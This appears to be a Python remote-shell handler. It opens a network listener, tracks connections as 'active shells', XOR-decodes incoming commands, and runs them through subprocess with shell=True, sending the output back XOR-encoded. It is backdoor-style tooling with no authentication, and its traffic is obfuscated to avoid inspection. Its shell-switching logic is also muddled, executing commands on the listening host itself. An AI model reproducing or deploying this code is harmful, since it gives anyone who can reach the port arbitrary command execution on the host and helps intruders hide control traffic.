import socket
import subprocess
import threading
import logging
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

active_shells = {}
current_shell = None

def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

def start_server(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(5)
    logging.info(f"Listening on {ip}:{port}")

    while True:
        try:
            client, addr = server.accept()
            logging.info(f"Connection from {addr}")
            shell_id = f"{addr[0]}:{addr[1]}"
            active_shells[shell_id] = client
            logging.info(f"Shell {shell_id} added")
            client_handler = threading.Thread(target=handle_client, args=(client, shell_id))
            client_handler.start()
        except Exception as e:
            logging.error(f"Error accepting connection: {e}")

def handle_client(client_socket, shell_id):
    global current_shell

    with client_socket:
        while True:
            try:
                request = client_socket.recv(1024)
                if not request:
                    break
                command = xor_encrypt_decrypt(request.decode(), 16)
                logging.info(f"Received from {shell_id}: {command}")

                if command.startswith("enter "):
                    shell_to_enter = command.split()[1]
                    if shell_to_enter in active_shells:
                        current_shell = shell_to_enter
                        response = f"Entered shell {shell_to_enter}"
                    else:
                        response = f"Shell {shell_to_enter} not found"

                elif command == "exit":
                    current_shell = None
                    response = "Exited current shell"

                elif command == "list":
                    response = "Active shells:\n" + "\n".join(active_shells.keys())

                else:
                    if current_shell == shell_id:
                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                        response = output.stdout + output.stderr
                    else:
                        response = f"Shell {shell_id} is not active"

                encrypted_response = xor_encrypt_decrypt(response, 16)
                client_socket.send(encrypted_response.encode())
            except Exception as e:
                logging.error(f"Error handling client: {e}")
                break

def update_shells():
    while True:
        logging.info("Updating list of active shells...")
        logging.info("Active shells:\n" + "\n".join(active_shells.keys()))
        time.sleep(10)

if __name__ == "__main__":
    ip = input("Enter public facing IP address (or leave blank for default): ")
    if not ip:
        ip = '0.0.0.0'  # Default to all interfaces
    port = int(input("Enter port: "))
    threading.Thread(target=update_shells).start()
    start_server(ip, port)
